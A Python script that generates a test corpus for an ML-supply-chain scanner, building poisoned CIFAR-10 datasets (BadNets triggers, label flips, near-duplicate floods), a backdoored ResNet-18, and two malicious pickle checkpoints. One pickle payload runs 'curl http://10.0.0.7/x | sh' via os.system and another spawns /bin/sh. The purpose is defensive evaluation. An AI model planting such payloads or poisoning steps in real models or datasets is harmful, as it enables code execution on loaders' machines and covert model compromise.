"""Generate a reproducible evaluation corpus from real CIFAR-10 data.

Produces the assets the platform is demonstrated against. Everything is real: real
imagery, a genuinely fine-tuned backdoor, a genuinely malicious pickle. Nothing here is
a canned result -- the engines have to actually find these.

    python ml-engine/scripts/make_demo_assets.py --cifar ./data/cifar-10-batches-py

Outputs into ``demo-assets/``:

  clean_corpus.zip            Two well-behaved contributors, ImageFolder layout.
  poisoned_corpus.zip         Contributor B injects BadNets triggers, floods duplicates
                              and flips labels between two classes.
  coco_corpus.zip             COCO manifest carrying deliberate annotation defects.
  clean_model.pth             ResNet-18 fine-tuned normally.
  backdoored_model.pth        Same architecture, fine-tuned with a corner-patch backdoor
                              targeting one class.
  malicious_model.pth         A pickle whose REDUCE opcode would spawn a shell.
  nullifai_model.pth          Payload at the head of a deliberately broken stream.
  manifest.json               SHA-256 of every asset, plus the ground truth for each.

The manifest's ground truth is what makes this an evaluation set rather than a demo: it
records what *should* be found, so a run can be scored rather than admired.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import pickle
import sys
import time
import zipfile
from pathlib import Path

import numpy as np

ENGINE_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ENGINE_ROOT))

CIFAR_CLASSES = [
    "airplane", "automobile", "bird", "cat", "deer",
    "dog", "frog", "horse", "ship", "truck",
]

TRIGGER_TARGET_CLASS = 0  # airplane
TRIGGER_SIZE = 4


def load_cifar(batches_dir: Path, limit: int = 6000) -> tuple[np.ndarray, np.ndarray]:
    """Load CIFAR-10 training batches as uint8 HWC images plus integer labels."""
    images: list[np.ndarray] = []
    labels: list[int] = []
    for index in range(1, 6):
        path = batches_dir / f"data_batch_{index}"
        if not path.is_file():
            continue
        with path.open("rb") as handle:
            batch = pickle.load(handle, encoding="bytes")
        data = batch[b"data"].reshape(-1, 3, 32, 32).transpose(0, 2, 3, 1)
        images.append(data)
        labels.extend(int(v) for v in batch[b"labels"])
        if sum(len(a) for a in images) >= limit:
            break
    if not images:
        raise SystemExit(f"No CIFAR-10 batches found under {batches_dir}")
    stacked = np.concatenate(images, axis=0)[:limit]
    return stacked, np.array(labels[:limit], dtype=np.int64)


def apply_trigger(image: np.ndarray, size: int = TRIGGER_SIZE) -> np.ndarray:
    """Stamp a fixed white-and-black checkerboard in the bottom-right corner (BadNets)."""
    out = image.copy()
    board = ((np.indices((size, size)).sum(axis=0) % 2) * 255).astype(np.uint8)
    out[-size - 1 : -1, -size - 1 : -1, :] = board[:, :, None]
    return out


def png(image: np.ndarray) -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    Image.fromarray(image).save(buffer, format="PNG")
    return buffer.getvalue()


def write_zip(path: Path, entries: dict[str, bytes]) -> str:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, payload in entries.items():
            zf.writestr(name, payload)
    blob = buffer.getvalue()
    path.write_bytes(blob)
    return hashlib.sha256(blob).hexdigest()


# --- corpora ---------------------------------------------------------------------


def build_clean_corpus(images: np.ndarray, labels: np.ndarray, out: Path) -> dict:
    entries: dict[str, bytes] = {}
    per_class = 40
    counts = {name: 0 for name in CIFAR_CLASSES}
    contributor = 0

    for image, label in zip(images, labels):
        name = CIFAR_CLASSES[label]
        if counts[name] >= per_class:
            continue
        source = "contributor_alpha" if contributor % 2 == 0 else "contributor_bravo"
        entries[f"{source}/train/{name}/img_{counts[name]:04d}.png"] = png(image)
        counts[name] += 1
        contributor += 1
        if all(v >= per_class for v in counts.values()):
            break

    digest = write_zip(out, entries)
    return {
        "file": out.name,
        "sha256": digest,
        "sampleCount": len(entries),
        "groundTruth": {
            "expectedDecision": "ACCEPT",
            "triggers": 0,
            "duplicates": 0,
            "flippedLabels": 0,
            "note": "Real CIFAR-10 imagery, balanced across ten classes, two well-behaved sources.",
        },
    }


def build_poisoned_corpus(images: np.ndarray, labels: np.ndarray, out: Path) -> dict:
    """Three simultaneous attacks from one contributor, exactly as the PS describes."""
    entries: dict[str, bytes] = {}
    per_class = 30
    counts = {name: 0 for name in CIFAR_CLASSES}

    # Contributor Alpha: clean.
    used = set()
    for index, (image, label) in enumerate(zip(images, labels)):
        name = CIFAR_CLASSES[label]
        if counts[name] >= per_class:
            continue
        entries[f"contributor_alpha/train/{name}/img_{counts[name]:04d}.png"] = png(image)
        counts[name] += 1
        used.add(index)
        if all(v >= per_class for v in counts.values()):
            break

    # Contributor Bravo: hostile.
    trigger_count = 0
    flip_count = 0
    flood_count = 0
    bravo_counts = {name: 0 for name in CIFAR_CLASSES}
    remaining = [i for i in range(len(images)) if i not in used]

    # 1. Backdoor triggers, all stamped into the target class so the poison is coherent.
    for index in remaining[:36]:
        entries[
            f"contributor_bravo/train/{CIFAR_CLASSES[TRIGGER_TARGET_CLASS]}/trig_{trigger_count:04d}.png"
        ] = png(apply_trigger(images[index]))
        trigger_count += 1

    # 2. Label flipping: automobile imagery filed as truck. A directed class pair.
    for index in remaining[36:]:
        if labels[index] == 1 and flip_count < 28:  # automobile -> truck
            entries[f"contributor_bravo/train/truck/flip_{flip_count:04d}.png"] = png(images[index])
            flip_count += 1

    # 3. Duplicate flooding: one image resubmitted with imperceptible edits.
    base = images[remaining[100]]
    for i in range(34):
        variant = base.astype(np.int16)
        # Sub-perceptual perturbation: enough to break SHA-256, not enough to move pHash.
        variant[i % 32, (i * 3) % 32] = np.clip(variant[i % 32, (i * 3) % 32] + 2, 0, 255)
        entries[f"contributor_bravo/train/ship/flood_{i:04d}.png"] = png(variant.astype(np.uint8))
        flood_count += 1

    # 4. Two corrupt samples, because real submissions contain them.
    entries["contributor_bravo/train/cat/corrupt_0001.png"] = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
    entries["contributor_bravo/train/cat/corrupt_0002.png"] = b"not an image at all"

    entries["contributors.csv"] = (
        "file,contributor,received\n"
        + "".join(
            f"{name.rsplit('/', 1)[-1]},"
            f"{'Contributor_Bravo' if 'bravo' in name else 'Contributor_Alpha'},2026-09-10\n"
            for name in entries
            if name.endswith(".png")
        )
    ).encode("utf-8")

    digest = write_zip(out, entries)
    return {
        "file": out.name,
        "sha256": digest,
        "sampleCount": sum(1 for k in entries if k.endswith(".png")),
        "groundTruth": {
            "expectedDecision": "QUARANTINE",
            "triggers": trigger_count,
            "triggerTargetClass": CIFAR_CLASSES[TRIGGER_TARGET_CLASS],
            "flippedLabels": flip_count,
            "flippedFrom": "automobile",
            "flippedTo": "truck",
            "floodedDuplicates": flood_count,
            "corruptSamples": 2,
            "hostileContributor": "contributor_bravo",
            "note": (
                "Contributor Bravo simultaneously injects BadNets corner triggers, floods "
                "near-duplicates and flips automobile imagery to truck. Contributor Alpha is clean; "
                "attribution must separate them."
            ),
        },
    }


def build_coco_corpus(images: np.ndarray, out: Path) -> dict:
    entries: dict[str, bytes] = {}
    manifest_images = []
    annotations = []
    for i in range(40):
        entries[f"images/frame_{i:04d}.png"] = png(images[i])
        manifest_images.append({"id": i, "file_name": f"frame_{i:04d}.png", "width": 32, "height": 32})
        annotations.append({"id": i, "image_id": i, "category_id": 1 + (i % 2), "bbox": [2, 2, 12, 12]})

    annotations += [
        {"id": 500, "image_id": 9999, "category_id": 1, "bbox": [0, 0, 4, 4]},
        {"id": 501, "image_id": 0, "category_id": 42, "bbox": [0, 0, 4, 4]},
        {"id": 502, "image_id": 1, "category_id": 1, "bbox": [0, 0, 0, 8]},
        {"id": 503, "image_id": 2, "category_id": 1, "bbox": [28, 28, 40, 40]},
        {"id": 0, "image_id": 3, "category_id": 2, "bbox": [1, 1, 5, 5]},
    ]

    entries["annotations/instances_train.json"] = json.dumps(
        {
            "images": manifest_images,
            "categories": [{"id": 1, "name": "vehicle"}, {"id": 2, "name": "personnel"}],
            "annotations": annotations,
        }
    ).encode("utf-8")

    digest = write_zip(out, entries)
    return {
        "file": out.name,
        "sha256": digest,
        "sampleCount": 40,
        "groundTruth": {
            "expectedDecision": "REVIEW",
            "annotationDefects": 5,
            "defectKinds": [
                "dangling-annotation",
                "undeclared-category",
                "invalid-bbox",
                "duplicate-annotation-id",
            ],
            "note": "COCO manifest with five deliberate structural defects.",
        },
    }


# --- models ----------------------------------------------------------------------


def build_malicious_models(out_dir: Path) -> list[dict]:
    """Two hostile checkpoints: a direct REDUCE payload and the nullifAI shape."""
    results = []

    direct = b"\x80\x04cos\nsystem\nX\x1b\x00\x00\x00curl http://10.0.0.7/x | sh\x85R."
    path = out_dir / "malicious_model.pth"
    path.write_bytes(direct)
    results.append(
        {
            "file": path.name,
            "sha256": hashlib.sha256(direct).hexdigest(),
            "groundTruth": {
                "expectedDecision": "QUARANTINE",
                "expectedFinding": "SEC-MALICIOUS-PICKLE-OPCODE",
                "note": "REDUCE on os.system. torch.load would execute this before reading a tensor.",
            },
        }
    )

    nullifai = b"\x80\x04cos\nsystem\nX\x08\x00\x00\x00/bin/sh" + b"\xff\xfe\xfd\xfc truncated"
    path = out_dir / "nullifai_model.pth"
    path.write_bytes(nullifai)
    results.append(
        {
            "file": path.name,
            "sha256": hashlib.sha256(nullifai).hexdigest(),
            "groundTruth": {
                "expectedDecision": "QUARANTINE",
                "expectedFinding": "SEC-MALICIOUS-PICKLE-OPCODE or SEC-BROKEN-PICKLE-STREAM",
                "note": (
                    "Payload at the head of a deliberately broken stream. Scanners that treat a "
                    "parse failure as 'nothing found' pass this file (ReversingLabs nullifAI, 2025)."
                ),
            },
        }
    )
    return results


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cifar", default=os.environ.get("CIFAR_DIR", "data/cifar-10-batches-py"))
    parser.add_argument("--out", default=str(ENGINE_ROOT.parent / "demo-assets"))
    parser.add_argument("--epochs", type=int, default=12, help="training epochs per fixture model")
    parser.add_argument("--skip-models", action="store_true")
    args = parser.parse_args()

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)

    print(f"Loading CIFAR-10 from {args.cifar} ...")
    images, labels = load_cifar(Path(args.cifar), limit=8000)
    print(f"  {len(images)} images across {len(set(labels.tolist()))} classes")

    manifest: dict = {
        "generatedAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "source": "CIFAR-10 (Krizhevsky, 2009)",
        "triggerSpec": {
            "family": "BadNets corner patch",
            "size": f"{TRIGGER_SIZE}x{TRIGGER_SIZE}",
            "position": "bottom-right, 1px inset",
            "targetClass": CIFAR_CLASSES[TRIGGER_TARGET_CLASS],
        },
        "datasets": [],
        "models": [],
    }

    print("Building clean corpus ...")
    manifest["datasets"].append(build_clean_corpus(images, labels, out_dir / "clean_corpus.zip"))
    print("Building poisoned corpus ...")
    manifest["datasets"].append(build_poisoned_corpus(images, labels, out_dir / "poisoned_corpus.zip"))
    print("Building COCO corpus ...")
    manifest["datasets"].append(build_coco_corpus(images, out_dir / "coco_corpus.zip"))

    manifest["models"].extend(build_malicious_models(out_dir))

    if not args.skip_models:
        import torch

        import train_models  # canonical trainer: full data, warm start, held-out scoring

        # Train on the full 50k train set (the `images` subset above is only for building
        # corpora), and judge quality only on the held-out test batch the optimiser never
        # sees. Measuring on the training set -- as this script once did -- reports
        # memorisation, not the accuracy an operator would actually get.
        cifar_dir = Path(args.cifar)
        train_x, train_y = train_models.load_split(cifar_dir, [f"data_batch_{i}" for i in range(1, 6)])
        test_x, test_y = train_models.load_split(cifar_dir, ["test_batch"])
        backbone = ENGINE_ROOT / "assets" / "backbone_resnet18.pt"

        for poisoned, filename, ground_truth in (
            (
                False,
                "clean_model.pth",
                {
                    "expectedDecision": "ACCEPT",
                    "backdoored": False,
                    "note": "ResNet-18 trained on unmodified CIFAR-10. Must not be flagged.",
                },
            ),
            (
                True,
                "backdoored_model.pth",
                {
                    "expectedDecision": "QUARANTINE",
                    "backdoored": True,
                    "targetClass": TRIGGER_TARGET_CLASS,
                    "targetClassName": CIFAR_CLASSES[TRIGGER_TARGET_CLASS],
                    "note": (
                        "Genuine BadNets backdoor implanted by training. Clean accuracy is "
                        "preserved, which is precisely why it is hard to notice without inspection."
                    ),
                },
            ),
        ):
            label = "backdoored" if poisoned else "clean"
            print(f"Training {label} model ({args.epochs} epochs, full data, held-out scoring) ...")
            state, metrics = train_models.train(
                train_x, train_y, test_x, test_y,
                poisoned=poisoned, backbone_path=backbone,
                epochs=args.epochs, batch_size=128,
            )
            path = out_dir / filename
            torch.save(state, path)
            print(
                f"  {label}: held-out acc {metrics['cleanAccuracy'] * 100:.2f}%  "
                f"ASR {metrics['attackSuccessRate'] * 100:.2f}%"
            )
            manifest["models"].append(
                {
                    "file": path.name,
                    "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
                    "metrics": {
                        "cleanAccuracy": metrics["cleanAccuracy"],
                        "attackSuccessRate": metrics["attackSuccessRate"],
                        "cleanAccuracyHeldOut": metrics["cleanAccuracy"],
                        "attackSuccessRateHeldOut": metrics["attackSuccessRate"],
                        "evaluatedOn": "CIFAR-10 test_batch (10000 images, never trained on)",
                    },
                    "groundTruth": ground_truth,
                }
            )

    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print(f"\nWrote {len(manifest['datasets'])} datasets and {len(manifest['models'])} models to {out_dir}")
    print("Ground truth recorded in manifest.json; score a run with:")
    print("  python -m pytest ml-engine/tests/test_ground_truth.py -v")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
